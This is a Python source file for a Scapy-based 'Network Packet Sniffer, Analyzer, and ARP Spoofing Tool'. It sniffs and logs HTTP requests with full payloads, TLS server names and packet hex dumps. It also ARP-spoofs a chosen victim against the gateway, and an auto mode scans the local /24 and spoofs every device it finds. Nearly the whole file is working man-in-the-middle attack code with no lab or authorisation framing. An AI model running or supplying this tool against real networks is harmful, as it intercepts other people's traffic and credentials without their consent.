import argparse
import socket
import time
import struct
from multiprocessing import Process
from scapy.all import sniff, send, IP, Raw, ARP, TCP
from datetime import datetime

LOG_FILE = "packet_log.txt"


def get_local_ip():
    """Retrieve the local machine's IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Error retrieving local IP: {e}")
        return None


def resolve_ip(ip_address):
    """Resolve IP address to domain name."""
    try:
        return socket.gethostbyaddr(ip_address)[0]
    except socket.herror:
        return ip_address


def get_network_range(ip):
    """Returns the /24 subnet range of an IP."""
    return f"{'.'.join(ip.split('.')[:3])}.0/24"


def extract_sni(packet):
    """Extract Server Name Indication (SNI) from HTTPS packets."""
    if packet.haslayer(TCP) and packet[TCP].dport == 443 and Raw in packet:
        payload = packet[Raw].load.decode(errors='ignore')
        sni_start = payload.find("\x00")
        if sni_start != -1:
            return payload[sni_start + 1:].split("\x00")[0]
    return None


def packet_callback(packet):
    """Callback function to process each sniffed packet."""
    timestamp_full = datetime.now()
    timestamp_short = timestamp_full.strftime("%H:%M:%S")

    # Check for HTTP requests on TCP port 80
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        tcp_layer = packet[TCP]
        if tcp_layer.dport == 80 or tcp_layer.sport == 80:
            try:
                payload_text = packet[Raw].load.decode('utf-8', errors='ignore')
            except Exception:
                payload_text = ""
            if payload_text.startswith(("GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "OPTIONS ")):
                method = payload_text.split()[0]
                request_line = payload_text.splitlines()[0] if payload_text.splitlines() else ""
                target = request_line.split()[1] if len(request_line.split()) >= 2 else ""
                host = "Unknown"
                for line in payload_text.splitlines():
                    if line.startswith("Host:"):
                        host = line.split(":", 1)[1].strip()
                        break
                net_range = get_network_range(packet[IP].src)
                header_line = (f"{net_range} > {local_ip}  » [{timestamp_short}] [net.sniff.http.request] "
                               f"http {packet[IP].src} {method} {host}{target}")
                log_entry = (f"Time: {timestamp_full}\n"
                             f"{header_line}\n\n"
                             f"{payload_text}\n\n"
                             + "-" * 50 + "\n")
                with open(LOG_FILE, "a") as log_file:
                    log_file.write(log_entry)
                print(log_entry)
                return  # Skip further processing for HTTP packet

    # Default logging for IP and ARP packets
    log_entry = ""
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        net_range = get_network_range(src_ip)
        direction = "Outgoing" if src_ip == local_ip else "Incoming"
        dst_domain = resolve_ip(dst_ip)
        protocol = packet[IP].proto
        payload = packet[Raw].load.hex() if packet.haslayer(Raw) else "None"
        protocol_name = "tcp" if protocol == 6 else "udp" if protocol == 17 else "ip"
        sni = extract_sni(packet) if protocol == 6 else None
        log_entry = (
                f"Time: {timestamp_full}\n"
                f"Direction: {direction}\n"
                f"Packet: {net_range} > {src_ip}  » [{timestamp_short}] [net.sniff.{protocol_name}] "
                f"{src_ip} > {'https://' + sni if sni else dst_domain}\n"
                f"Payload (hex): {payload}\n"
                + "-" * 50 + "\n"
        )
    elif packet.haslayer(ARP):
        src_ip = packet[ARP].psrc
        dst_ip = packet[ARP].pdst
        operation = "Request" if packet[ARP].op == 1 else "Reply"
        log_entry = (
                f"Time: {timestamp_full}\n"
                f"Direction: ARP {operation}\n"
                f"Packet: {src_ip} > {dst_ip}\n"
                f"Payload (hex): None\n"
                + "-" * 50 + "\n"
        )
    if log_entry:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(log_entry)
        print(log_entry)


def sniff_packets():
    """Function to start packet sniffing."""
    print("Starting Packet Sniffer... (Press Ctrl+C to stop)")
    sniff(prn=packet_callback, store=0, filter="ip or arp")


def analyze_log(file_path, target_ip=None):
    """Analyze the log file; if target_ip is provided, filter blocks containing that IP."""
    try:
        with open(file_path, "r") as log_file:
            logs = log_file.read()
            if target_ip:
                blocks = logs.split("-" * 50 + "\n")
                filtered = [blk for blk in blocks if target_ip in blk]
                logs = "\n" + ("-" * 50 + "\n").join(filtered)
            print("Analyzing Log File...\n")
            print(logs)
    except FileNotFoundError:
        print(f"Error: The file {file_path} does not exist.")


def arp_get_mac(ip):
    """Use Scapy's srp to get the MAC address for a given IP."""
    from scapy.all import srp, Ether
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = srp(broadcast / arp_request, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None


def restore_arp(victim_ip, spoof_ip):
    """Restore the victim's ARP table by sending the correct mapping."""
    victim_mac = arp_get_mac(victim_ip)
    real_mac = arp_get_mac(spoof_ip)
    if victim_mac and real_mac:
        packet = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst=victim_mac, hwsrc=real_mac)
        send(packet, count=4, verbose=False)
        print(f"Restored ARP table for {victim_ip}")
    else:
        print("Could not restore ARP table properly. Check connectivity.")


def arp_spoofing(victim_ip, spoof_ip):
    """Continuously send ARP spoofing packets to the victim."""
    print(f"Starting ARP spoofing: Victim {victim_ip}, Spoofing as {spoof_ip}")
    try:
        while True:
            victim_mac = arp_get_mac(victim_ip)
            if victim_mac is None:
                print(f"Could not get MAC address for {victim_ip}.")
                break
            packet = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst=victim_mac)
            send(packet, verbose=False)
            print(f"Sent spoofed ARP packet to {victim_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nARP spoofing interrupted. Restoring network...")
        restore_arp(victim_ip, spoof_ip)
        print("Exiting ARP spoof mode.")


def get_default_gateway():
    """Retrieve the default gateway IP address (Linux)."""
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                fields = line.strip().split()
                if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                    continue
                gateway = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
                return gateway
    except Exception as e:
        print("Error retrieving default gateway:", e)
        return None


def scan_network(network):
    """Scan the given network (e.g. '192.168.1.0/24') and return a list of active devices."""
    from scapy.all import srp, Ether, ARP
    print(f"Scanning network {network} for active devices...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network), timeout=2, verbose=False)
    devices = []
    for sent, received in ans:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    print(f"Found {len(devices)} devices.")
    return devices


def run_ss(victim_ip, spoof_ip):
    """Run sniffing and ARP spoofing concurrently for a specific victim."""
    p_sniff = Process(target=sniff_packets)
    p_spoof = Process(target=arp_spoofing, args=(victim_ip, spoof_ip))
    p_sniff.start()
    p_spoof.start()
    try:
        p_sniff.join()
        p_spoof.join()
    except KeyboardInterrupt:
        print("\nInterrupt received. Terminating both processes...")
        p_sniff.terminate()
        p_spoof.terminate()
        restore_arp(victim_ip, spoof_ip)
        print("Both processes terminated. Exiting.")


def run_ss_auto():
    """Auto mode: scan the network and spoof every discovered device (except local and gateway) while sniffing."""
    local = get_local_ip()
    network = get_network_range(local)
    gateway = get_default_gateway()
    if not gateway:
        print("Could not determine default gateway. Exiting auto mode.")
        return
    devices = scan_network(network)
    victims = [d for d in devices if d['ip'] != local and d['ip'] != gateway]
    if not victims:
        print("No victim devices found to spoof.")
        return
    processes = []
    print(f"Default gateway detected: {gateway}")
    for victim in victims:
        print(f"Setting up spoof for victim: {victim['ip']} (MAC: {victim['mac']})")
        p = Process(target=arp_spoofing, args=(victim['ip'], gateway))
        p.start()
        processes.append(p)
    p_sniff = Process(target=sniff_packets)
    p_sniff.start()
    processes.append(p_sniff)
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\nInterrupt received. Terminating all processes...")
        for p in processes:
            p.terminate()
        for victim in victims:
            restore_arp(victim['ip'], gateway)
        print("All processes terminated. Exiting auto mode.")


# Use a parent parser so -i is recognized globally
global_parser = argparse.ArgumentParser(add_help=False)
global_parser.add_argument("-i", "--ip", type=str,
                           help="Target IP for filtering (analysis mode) or specific victim (ss mode)")


def main():
    parser = argparse.ArgumentParser(
        description="Network Packet Sniffer, Analyzer, and ARP Spoofing Tool",
        parents=[global_parser]
    )
    parser.add_argument("-a", "--analyze", type=str, help="Analyze a packet log file")

    subparsers = parser.add_subparsers(dest="command", help="Modes of operation")

    # Subcommand for sniffing
    subparsers.add_parser("sniff", parents=[global_parser], help="Run packet sniffing only")

    # Subcommand for ARP spoofing (manual mode)
    spoof_parser = subparsers.add_parser("spoof", parents=[global_parser],
                                         help="Run ARP spoofing only")
    spoof_parser.add_argument("victim", type=str, help="Victim IP address")
    spoof_parser.add_argument("spoof", type=str, help="IP to spoof (usually the gateway)")

    # Subcommand for running both concurrently (ss mode)
    ss_parser = subparsers.add_parser("ss", parents=[global_parser],
                                      help="Run both sniffing and ARP spoofing concurrently")
    ss_parser.add_argument("victim", type=str, nargs="?", help="Victim IP address (optional if -i is used)")
    ss_parser.add_argument("spoof", type=str, nargs="?",
                           help="IP to spoof (optional if -i is used; usually the gateway)")

    args = parser.parse_args()

    # Analysis mode: if -a flag is provided, filter by target IP if available.
    if args.analyze:
        analyze_log(args.analyze, args.ip)
        return

    global local_ip
    local_ip = get_local_ip()
    if not local_ip:
        print("Could not determine local IP address. Exiting.")
        return

    if args.command == "sniff":
        sniff_packets()
    elif args.command == "spoof":
        arp_spoofing(args.victim, args.spoof)
    elif args.command == "ss":
        # If -i is provided, use that as victim and automatically obtain gateway.
        if args.ip:
            gateway = get_default_gateway()
            if not gateway:
                print("Could not determine default gateway. Exiting.")
                return
            run_ss(args.ip, gateway)
        # Otherwise, if positional arguments are provided, use them.
        elif args.victim and args.spoof:
            run_ss(args.victim, args.spoof)
        else:
            run_ss_auto()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
